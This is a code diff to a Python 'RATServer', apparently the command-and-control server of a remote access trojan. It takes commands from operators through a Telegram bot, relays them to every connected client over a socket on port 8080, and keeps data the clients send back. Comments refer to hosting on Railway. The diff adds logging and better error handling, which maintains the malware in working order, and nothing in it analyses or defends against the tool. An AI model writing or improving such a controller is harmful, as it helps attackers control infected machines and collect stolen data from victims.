@@ -3,17 +3,20 @@ import json
 import socket
 import threading
 import os
+import logging
 from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler
 import binascii
 
+logging.basicConfig(level=logging.INFO)
+
 class RATServer:
     def __init__(self):
-        self.bot_token = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')  # Из Railway vars
-        self.allowed_chat_id = int(os.getenv('CHAT_ID', 'YOUR_CHAT_ID'))  # Из Railway vars
+        self.bot_token = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
+        self.allowed_chat_id = int(os.getenv('CHAT_ID', 'YOUR_CHAT_ID'))
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server_socket.bind(("0.0.0.0", 8080))  # Bind to 0.0.0.0 for Railway
+        self.server_socket.bind(("0.0.0.0", 8080))
         self.clients = []
         self.data_store = []
 
@@ -72,7 +75,8 @@ class RATServer:
         for client in self.clients[:]:
             try:
                 client.send(command.encode())
-            except:
+            except Exception as e:
+                logging.error(f"Client send error: {e}")
                 self.clients.remove(client)
 
     def handle_client(self, client_socket):
@@ -87,16 +91,18 @@ class RATServer:
                 self.data_store.append(data_dict)
                 if len(self.data_store) > 100:
                     self.data_store = self.data_store[-100:]
-            except:
+            except Exception as e:
+                logging.error(f"Handle client error: {e}")
                 break
         client_socket.close()
         self.clients.remove(client_socket)
 
     def start_server(self):
         self.server_socket.listen(5)
-        print("Сервер запущен на 0.0.0.0:8080")
+        logging.info("Сервер запущен на 0.0.0.0:8080")
         while True:
-            client_socket, _ = self.server_socket.accept()
+            client_socket, addr = self.server_socket.accept()
+            logging.info(f"New client from {addr}")
             self.clients.append(client_socket)
             threading.Thread(target=self.handle_client, args=(client_socket,)).start()
 
@@ -108,7 +114,7 @@ class RATServer:
         await app.initialize()
         await app.start()
         await app.updater.start_polling()
-        print("Бот запущен")
+        logging.info("Бот запущен")
 
     def run(self):
         threading.Thread(target=self.start_server).start()
